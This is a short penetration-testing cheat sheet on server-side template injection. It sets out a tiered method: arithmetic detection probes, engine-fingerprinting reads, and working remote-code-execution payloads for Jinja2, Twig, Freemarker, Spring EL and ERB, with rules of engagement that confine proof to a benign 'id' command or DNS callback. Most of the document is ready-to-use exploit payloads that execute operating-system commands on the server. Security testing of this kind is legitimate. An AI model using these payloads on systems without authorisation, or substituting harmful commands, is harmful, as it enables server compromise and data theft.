# Server-Side Template Injection

Input rendered into a server-side template. Detect first with math, identify the engine, then climb the minimum ladder to prove code exec. Confirm RCE with a benign command (`id`, DNS callback) — never a destructive one.

## Tier 1 — Detection probes
Send math; a rendered `49` means evaluation. Then narrow the engine by which syntax evaluates.
```
{{7*7}}        # Jinja2, Twig, Nunjucks, Django(partial)  → 49
${7*7}         # Freemarker, Spring EL, JSP EL             → 49
#{7*7}         # Ruby ERB-ish / some frameworks
<%= 7*7 %>     # ERB (Ruby)
{7*7}          # some (Smarty-ish)
${{7*7}}  #{7*7}  *{7*7}   # spray to see which engine bites
{{7*'7'}}      # Jinja2 → 7777777 ; Twig → 49  (disambiguates the two)
```
Polyglot detector:
```
${{<%[%'"}}%\.
```
If it errors loudly, the parser choked on template syntax = candidate.

## Tier 2 — Engine confirmation reads
Non-destructive object access to confirm engine + reachable internals.
```
Jinja2:     {{ config }}    {{ self }}    {{ ''.__class__ }}
Twig:       {{ _self }}     {{ dump(app) }}
Freemarker: ${object}       ${.version}
ERB:        <%= defined?(Rails) %>
Velocity:   #set($x=1)$x
```

## Tier 3 — RCE ladders
Prove exec with `id`/`uname`/DNS callback only.

Jinja2 (Python):
```
{{ ''.__class__.__mro__[1].__subclasses__() }}          # find Popen index
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}
```
Twig (PHP):
```
{{ ['id']|filter('system') }}
{{ ['id']|map('system')|join }}
{{ _self.env.registerUndefinedFilterCallback('system') }}{{ _self.env.getFilter('id') }}
```
Freemarker (Java):
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id")}
```
Spring EL / SpEL:
```
${T(java.lang.Runtime).getRuntime().exec('id')}
*{T(java.lang.Runtime).getRuntime().exec('id')}
#{T(java.lang.Runtime).getRuntime().exec('id')}
```
ERB (Ruby):
```
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').read %>
```

## Stop when
Rendered arithmetic proves template evaluation (medium). One benign command output (`uid=...` from `id`) or a DNS callback proves RCE (critical). Capture request + the `id` output. Do not read `/etc/shadow`, do not spawn shells, do not pivot. Stop at the single command proof.
